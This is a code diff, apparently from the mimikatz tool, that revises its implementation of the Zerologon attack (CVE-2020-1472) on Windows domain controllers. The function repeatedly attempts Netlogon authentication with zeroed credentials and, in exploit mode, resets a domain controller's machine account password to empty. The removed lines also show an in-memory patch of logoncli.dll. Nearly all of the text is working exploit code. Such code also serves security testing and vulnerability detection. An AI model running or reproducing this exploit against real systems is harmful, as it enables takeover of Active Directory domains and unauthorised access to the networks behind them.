@@ -2448,63 +2448,40 @@ NTSTATUS kuhl_m_lsadump_mbc(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-// Just to let you know about the little hack to make NETAPI32 to use ncacn_ip_tcp instead of ncacn_np
-//
-//NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
-//{
-//	DWORD i;
-//	NETLOGON_CREDENTIAL Input = {0}, LazyOutput;
-//	ULONG NegotiateFlags = 0x212fffff;
-//	
-//	PBYTE z = (PBYTE) GetModuleHandle(L"logoncli.dll");
-//
-//	VirtualProtect(z + 0x19031, 1, PAGE_EXECUTE_READWRITE, &i);
-//	z[0x19031] = 2;
-//	VirtualProtect(z + 0x19031, 1, i, &i);
-//
-//	for(i = 0; i < 2000; i++)
-//	{
-//		I_NetServerReqChallenge(L"dc.lab.local", MIMIKATZ, &Input, &LazyOutput);
-//		if((I_NetServerAuthenticate2(L"dc.lab.local", L"dc$", ServerSecureChannel, MIMIKATZ, &Input, &LazyOutput, &NegotiateFlags) == STATUS_SUCCESS))
-//		{
-//			kprintf(L"\nAuth :)\n");
-//			break;
-//		}
-//		else kprintf(L"=");
-//	}
-//	return STATUS_SUCCESS;
-//}
-
 // All of that is not very thread safe
 handle_t hLogonNetLogon = NULL;
 handle_t __RPC_USER LOGONSRV_HANDLE_bind(IN LOGONSRV_HANDLE Name) {return hLogonNetLogon;}
 void __RPC_USER LOGONSRV_HANDLE_unbind(IN LOGONSRV_HANDLE Name, handle_t hLogon) {}
+//const GENERIC_BINDING_ROUTINE_PAIR logon___local_BindingRoutines = {(GENERIC_BINDING_ROUTINE) LOGONSRV_HANDLE_bind, (GENERIC_UNBIND_ROUTINE) LOGONSRV_HANDLE_unbind};
+//static const RPC_CLIENT_INTERFACE logon___local_RpcClientInterface = {sizeof(RPC_CLIENT_INTERFACE), {{0x12345678, 0x1234, 0xabcd, {0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0xcf, 0xfb}}, {1, 0}}, {{0x8a885d04, 0x1ceb, 0x11c9, {0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60}}, {2, 0}}, 0, 0, 0, 0, 0, 0x00000000};
 
-const wchar_t * SecureChannelTypes[] = {L"Null", L"MsvAp", L"Workstation", L"TrustedDnsDomain", L"TrustedDomain", L"UasServer", L"Server", L"CdcServer"};
 /*	This function `zerologon` is inspired by @SecuraBV work on CVE-2020-1472
 */
+const wchar_t * SecureChannelTypes[] = {L"Null", L"MsvAp", L"Workstation", L"TrustedDnsDomain", L"TrustedDomain", L"UasServer", L"Server", L"CdcServer"};
 NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 {
 	NTSTATUS status;
 	NETLOGON_AUTHENTICATOR Authenticator = {{0}, 0}, ReturnAuthenticator;
-	ULONG i, NegotiateFlags = 0x212fffff;
+	ULONG AuthnSvc, i, NegotiateFlags = 0x212fffff;
 	NL_TRUST_PASSWORD ClearNewPassword = {{0}, 0};
-	LPCWSTR szTarget, szAccount, szType;
+	LPCWSTR szRemote, szProtSeq, szAccount, szType;
 	NETLOGON_SECURE_CHANNEL_TYPE type = ServerSecureChannel;
-	BOOL bExploit, bIsAuth = FALSE, bIsChanged = FALSE;
+	BOOL bExploit, bIsAuth = FALSE, bIsChanged = FALSE, bIsNullSession;
+	//GENERIC_BINDING_ROUTINE_PAIR OriginalBindingPair, *pOriginalBindingPair;
 
-	if(kull_m_string_args_byName(argc, argv, L"target", &szTarget, NULL))
+	if(kull_m_string_args_byName(argc, argv, L"account", &szAccount, NULL))
 	{
-		if(kull_m_string_args_byName(argc, argv, L"account", &szAccount, NULL))
-		{
-			if(kull_m_string_args_byName(argc, argv, L"type", &szType, NULL))
-				type = (NETLOGON_SECURE_CHANNEL_TYPE) wcstoul(szType, NULL, 0);
-			bExploit = kull_m_string_args_byName(argc, argv, L"exploit", NULL, NULL);
+		if(kull_m_string_args_byName(argc, argv, L"type", &szType, NULL))
+			type = (NETLOGON_SECURE_CHANNEL_TYPE) wcstoul(szType, NULL, 0);
+		bExploit = kull_m_string_args_byName(argc, argv, L"exploit", NULL, NULL);
 
-			kprintf(L"Target : %s\nAccount: %s\nType   : %u (%s)\nMode   : %s\n\n", szTarget, szAccount, type, (type < ARRAYSIZE(SecureChannelTypes)) ? SecureChannelTypes[type] : L"?", bExploit ? L"exploit" : L"detect");
-			if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szTarget, NULL, NULL, FALSE, RPC_C_AUTHN_NONE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hLogonNetLogon, NULL))
-			{
-				status = RpcEpResolveBinding(hLogonNetLogon, logon_v1_0_c_ifspec);
+		kull_m_rpc_getArgs(argc, argv, &szRemote, &szProtSeq, NULL, NULL, &AuthnSvc, RPC_C_AUTHN_NONE, &bIsNullSession, NULL, TRUE);
+		kprintf(L"\nTarget : %s\nAccount: %s\nType   : %u (%s)\nMode   : %s\n\n", szRemote, szAccount, type, (type < ARRAYSIZE(SecureChannelTypes)) ? SecureChannelTypes[type] : L"?", bExploit ? L"exploit" : L"detect");
+		if(kull_m_rpc_createBinding(NULL, szProtSeq, szRemote, NULL, L"RPC", TRUE, AuthnSvc, bIsNullSession ? KULL_M_RPC_AUTH_IDENTITY_HANDLE_NULLSESSION : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hLogonNetLogon, NULL))
+		{
+			//if(kull_m_rpc_replace_first_routine_pair(L"logoncli.dll", &logon___local_RpcClientInterface.InterfaceId, &logon___local_BindingRoutines, &OriginalBindingPair, &pOriginalBindingPair))
+			//{
+				status = RpcEpResolveBinding(hLogonNetLogon, logon_v1_0_c_ifspec/*(RPC_IF_HANDLE) &logon___local_RpcClientInterface*/);
 				if(status == RPC_S_OK)
 				{
 					kprintf(L"Trying to \'authenticate\'...\n");
@@ -2512,10 +2489,10 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 					{
 						for(i = 0; i < 2000; i++)
 						{
-							status = NetrServerReqChallenge(NULL, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential);
+							status = NetrServerReqChallenge(NULL, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential); // I_NetServerReqChallenge
 							if(status == STATUS_SUCCESS)
 							{
-								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags);
+								status = NetrServerAuthenticate2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator.Credential, &ReturnAuthenticator.Credential, &NegotiateFlags); // I_NetServerAuthenticate2
 								if(status == STATUS_SUCCESS)
 								{
 									bIsAuth = TRUE;
@@ -2523,7 +2500,7 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 									if(bExploit)
 									{
 										kprintf(L"\n");
-										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator, &ReturnAuthenticator, &ClearNewPassword);
+										status = NetrServerPasswordSet2(NULL, (wchar_t *) szAccount, type, MIMIKATZ, &Authenticator, &ReturnAuthenticator, &ClearNewPassword); // I_NetServerPasswordSet2
 										if(status == STATUS_SUCCESS)
 										{
 											bIsChanged = TRUE;
@@ -2555,19 +2532,20 @@ NTSTATUS kuhl_m_lsadump_zerologon(int argc, wchar_t * argv[])
 					RpcExcept(RPC_EXCEPTION)
 						PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
 					RpcEndExcept
-						kprintf(L"\n\n* Authentication: %s\n", bIsAuth ? L"OK -- vulnerable" : L"KO -- maybe not vulnerable");
+
+					kprintf(L"\n\n* Authentication: %s\n", bIsAuth ? L"OK -- vulnerable" : L"KO -- maybe not vulnerable");
 					if(bExploit)
 					{
 						kprintf(L"* Set password  : %s\n", bIsChanged ? L"OK -- may be unstable" : L"KO");
 					}
 				}
 				else PRINT_ERROR(L"RpcEpResolveBinding: 0x%08x\n", status);
-				kull_m_rpc_deleteBinding(&hLogonNetLogon);
-			}
+			//	kull_m_rpc_replace_first_routine_pair_direct(pOriginalBindingPair, &OriginalBindingPair);
+			//}
+			kull_m_rpc_deleteBinding(&hLogonNetLogon);
 		}
-		else PRINT_ERROR(L"Missing /account argument, usually a DC$ account\n");
 	}
-	else PRINT_ERROR(L"Missing /target argument, can be IP or FQDN of a domain controller\n");
+	else PRINT_ERROR(L"Missing /account argument, usually a DC$ account\n");
 
 	return STATUS_SUCCESS;
 }
@@ -2627,7 +2605,7 @@ NTSTATUS kuhl_m_lsadump_update_dc_password(int argc, wchar_t * argv[])
 		}
 		else PRINT_ERROR(L"A /account argument is needed\n");
 	}
-	else PRINT_ERROR(L"A /server argument is needed\n");
+	else PRINT_ERROR(L"A /target argument is needed\n");
 
 	return STATUS_SUCCESS;
 }
